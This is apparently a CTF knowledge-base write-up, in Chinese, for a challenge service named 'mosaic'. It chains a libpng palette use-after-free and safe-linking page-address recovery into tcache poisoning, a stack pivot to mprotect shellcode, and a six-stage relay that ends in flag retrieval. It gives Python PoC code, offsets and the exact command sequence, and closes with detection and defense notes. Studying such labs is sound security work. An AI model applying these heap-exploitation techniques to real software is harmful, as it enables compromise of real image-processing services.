---
id: ctf-pwn-libpng-palette-uaf-page-oracle-six-stage-relay
title: libpng 调色板对象 UAF + 页地址 oracle 绕过 safe-linking，六段中继到账本/议会
type: scenario
domain: ctf
path: ctf/pwn
technique: libpng-palette-uaf-page-oracle-relay
tags:
- ctf
- pwn
- libpng
- uaf
- safe-linking
- page-oracle
- relay
- heap-layout
- png
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T02:00:03+08:00'
  notes: 已对照原文核对；libpng 调色板 UAF、safe-linking 页地址 oracle、状态机 C/T/Q 原语与 worker→broker→keeper→seal 中继一致
url: /docs/ctf/pwn/ctf-pwn-libpng-palette-uaf-page-oracle-six-stage-relay/
draft: false
kb_aliases:
- mosaic
- libpng 调色板 UAF
- 页地址 oracle
- safe-linking 低 12 位枚举
- PNG 解压释放序列
- 六段中继
---

## 一句话结论

mosaic 的 worker 用 libpng 处理 PNG，调色板对象在解压/释放序列中产生 UAF；由于远程 libpng 布局固定，可以通过命中二分测出画布地址与另一个地址的固定差值，并确定调色板对象是第二个被释放的块。利用 safe-linking 的编码关系 `fd = page ^ (P >> 12)`，在已知 `P - page*0x1000 = low12` 与固定差值的前提下枚举低 12 位，解出完整页地址，再把 `P->fd` 投毒到画布/栈目标，借助状态机的 `E/T/Q` 操作实现任意读写与栈枢轴；worker 被攻陷后再通过 broker→keeper→seal 的中继进入账本与议会，复用已验证的负索引读表/tcache 投毒协议，最终由议会门触发 flag 发送。

## 原理

- **worker 与 UAF**：worker 使用 libpng 1.6.43 风格布局处理上传的 PNG；构造特定的 PNG 解压与释放序列，使调色板对象被释放后仍被后续操作引用，形成 UAF。调色板对象是第二个被释放的块，其地址与画布/目标缓冲区有固定差值（远程布局可由命中二分/探测确定）。
- **页地址 oracle**：glibc 2.32+ 的 safe-linking 把 tcache `fd` 编码为 `page ^ (P >> 12)`，其中 `P` 是 fd 字段所在 chunk 的地址。若已知 `P = (page << 12) | low12` 且 `low12` 是固定值（或可枚举 0..0xfff 步长 0x10），则有：
  - `S = low12 + d1`（d1 是目标与 P 的固定差值）
  - `t = S & 0xfff`，`c = S >> 12`
  - `r = (fd & 0xfff) ^ t`
  - `t2 = r + c`，要求 `< 0x1000`
  - `W = (fd >> 12) ^ t2`
  - 由 `W = H ^ (H >> 12)` 反解 `H`（逐位提升：`H_i = W_i ^ H_{i-12}`）
  - `page = (H << 12) | r`，`P = (page << 12) | low12`
  - 验证 `(page ^ ((P + d1) & M)) == fd`
- **状态机原语**：PNG 的 `L` 加载、`D` 解压、`V` 泄露调色板 fd、`E/F/K` 推进状态机、`C` 分三段写入 poison 编码、`T` 把画布+0x50 设为读目标、`Q` 从目标读 8 字节、`U` 触发释放。通过 `C` 把 `P->fd` 投毒到 `canvas+0x30`，`E` 后 `T/Q` 即可读写画布；再泄露 `io_ptr`、`read_data_fn`、libc 指针，计算 PIE/libc/栈地址。
- **控制流**：在画布上布置 `mprotect(canvas_page,0x2000,7)` + shellcode；再 `U` 释放并用 `C` 把 `P->fd` 投毒到 `rbp_2418`，`E` 写入 `fake_rbp=canvas+0x100` 与 `leave; ret`，栈枢轴到画布 ROP，执行 shellcode/中继。
- **六段中继**：worker 攻陷后发送 stage2 relay，broker 返回 `MBRK2` 问候；broker 泄露/伪造后进入 keeper（格式化字符串 + 栈溢出），keeper 进入 seal（VM 程序 + gate），seal 返回原始 LEDGER 中继；账本/议会协议与 redisrelay 同源，仅本构建 flag 发送函数偏移为 PIE+0x2C90（redisrelay 为 PIE+0x2C80）。

## 触发条件

- 目标服务用 libpng 处理攻击者上传的 PNG，且存在调色板对象释放后复用/UAF。
- libpng 版本/构建的堆布局稳定，调色板对象与画布/目标缓冲区的差值可探测。
- tcache 启用 safe-linking，但 fd 编码的低位/页关系可被枚举（已知 low12 或差值）。
- 服务提供状态机操作（加载/解压/泄露/写 poison/读目标/释放），可把 UAF 转成任意读写。
- 后续 broker/keeper/seal/ledger/council 中继可达，账本/议会协议可复用。

## 利用步骤

1. 构造最小调色板 PNG（3×2、8 位索引色），`L` 加载，`D` 解压，连续 `V` 读取调色板 fd。
2. 用 `pagesolve(fd, d1)` 枚举低 12 位并反解页地址，得到 `P`、画布、dest、目标槽；若多解用命中二分/多次请求收敛。
3. 按 `E/F/D/K/E/D` 推进状态机；用 `C` 分三段把 `page ^ (canvas+0x30)` 写入 poison，`E` 完成投毒；`T` 设置 `canvas+0x50=dest`，`Q` 读 377 字节泄露 `io_ptr/read_data_fn/libc_leak`。
4. 计算 `pie=read_data_fn-0x1b2e`、`libc=libc_leak-0x421f0`、`rbp=io_ptr+0x120`；在画布布置 mprotect + shellcode/relay，`T` 写入。
5. `U` 释放，`C` 把 `P->fd` 投毒到 `rbp`，`E` 写入 `fake_rbp=canvas+0x100` 与 `pie+leave_ret`，触发栈枢轴。
6. 发送 stage2 relay，确认 broker `MBRK2`；依次完成 broker→keeper→seal 中继，进入账本/议会，`0x40` 取 flag。

## PoC

页地址恢复：

```python
M = (1 << 64) - 1

def pagesolve(fd, d1, low12):
    S = low12 + d1
    t = S & 0xfff
    c = S >> 12
    r = (fd & 0xfff) ^ t
    t2 = r + c
    if t2 >= 0x1000:
        return None
    W = (fd >> 12) ^ t2
    H = 0
    for i in range(W.bit_length() + 24):
        wi = (W >> i) & 1
        if i >= 12:
            wi ^= (H >> (i - 12)) & 1
        H |= wi << i
    page = (H << 12) | r
    P = (page << 12) | low12
    if 0x400000000000 <= P < (1 << 48) and (page ^ ((P + d1) & M)) == fd:
        return P
    return None
```

PNG 构造与状态机（节选）：

```python
def chunk(t, d):
    return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)

def png(pix, pal=None):
    pal = pal or bytes((i * 11) & 0xff for i in range(768))
    raw = b"\x00" + bytes(pix[0:3]) + b"\x00" + bytes(pix[3:6])
    return (b"\x89PNG\r\n\x1a\n" +
            chunk(b"IHDR", struct.pack(">IIBBBBB", 3, 2, 8, 3, 0, 0, 0)) +
            chunk(b"PLTE", pal) + chunk(b"IDAT", zlib.compress(raw, 9)) + chunk(b"IEND", b""))
```

状态机顺序：`L(png)` → `D` → `V*6` 取 fd → `E,F,D,K,E,D` → `C` 投毒 `canvas+0x30` → `E` → `T`（payload 0x50 写 dest）→ `Q` 读 377 字节 → `T` 写 ROP → `U` → `C` 投毒 `rbp` → `E` 枢轴。

## 变体与关联

- 若 low12 未知，可枚举 0x1000/0x10 个候选，用 `(page ^ ((P+d1)&M)) == fd` 过滤；若 d1 也未知，可用命中二分/多目标探测。
- libpng 版本/构建变化会改变调色板与画布差值，需要重新指纹；核心 UAF/状态机原语不变。
- 没有 safe-linking 时 fd 为明文，页地址恢复更简单；有 tcache key 时需先清 key 或换 fastbin/unsorted bin。
- 关联：libpng 调色板 UAF、safe-linking 页地址恢复、多级中继、账本负索引读表卡。

## 检测与防御

- 升级 libpng 到修复版本，严格管理调色板/图像对象生命周期；对 PNG 解压失败/重复释放路径做审计。
- 服务进程使用低权限、最小 fd、seccomp；图像处理放在隔离 worker，限制堆布局可预测性（ASLR/分配器加固）。
- 不要把内部 broker/keeper/seal/ledger 协议暴露给图像处理 worker；中继入口做认证与帧校验。
- 检测：PNG 中异常 PLTE/IDAT 组合、短时间内大量解压/释放、状态机 `Q` 读取固定偏移、worker 进程连接 broker unix socket。
